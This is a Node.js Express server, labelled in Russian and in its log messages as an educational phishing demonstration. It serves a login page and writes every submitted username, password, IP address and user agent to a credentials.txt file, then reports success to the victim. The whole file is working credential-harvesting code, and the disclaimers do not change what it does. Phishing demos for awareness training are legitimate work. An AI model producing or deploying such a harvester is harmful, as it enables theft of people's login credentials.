// ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ: НЕ ДЛЯ РЕАЛЬНОГО ИСПОЛЬЗОВАНИЯ
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

// Route to serve the main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login POST requests
app.post('/login', (req, res) => {
    const { username, password, remember } = req.body;
    
    // Get current date and time
    const now = new Date();
    const timestamp = now.toISOString();
    
    // Format the credentials data
    const credentialsData = `
=== CAPTURED CREDENTIALS (EDUCATIONAL PURPOSES ONLY) ===
Timestamp: ${timestamp}
Username: ${username}
Password: ${password}
Remember me: ${remember ? 'Yes' : 'No'}
IP Address: ${req.ip || 'localhost'}
User Agent: ${req.headers['user-agent'] || 'Unknown'}
=======================================================
`;

    // Append to credentials.txt file
    fs.appendFile(
        path.join(__dirname, 'credentials.txt'),
        credentialsData,
        (err) => {
            if (err) {
                console.error('Error writing to credentials file:', err);
            } else {
                console.log('Credentials saved (EDUCATIONAL DEMO ONLY)');
            }
        }
    );
    
    // Send success response
    res.status(200).json({ success: true });
    
    // Log warning
    console.warn('⚠️ CREDENTIALS CAPTURED FOR EDUCATIONAL PURPOSES ONLY ⚠️');
    console.warn('This is a demonstration of how phishing attacks work.');
    console.warn('Using such techniques for malicious purposes is illegal and unethical.');
});

// Start the server
app.listen(PORT, () => {
    console.log(`
⚠️ EDUCATIONAL PROJECT ONLY ⚠️
Server running at http://localhost:${PORT}
This is a demonstration of how phishing attacks work.
Using such techniques for malicious purposes is illegal and unethical.
This project is for educational purposes only.
`);
}); 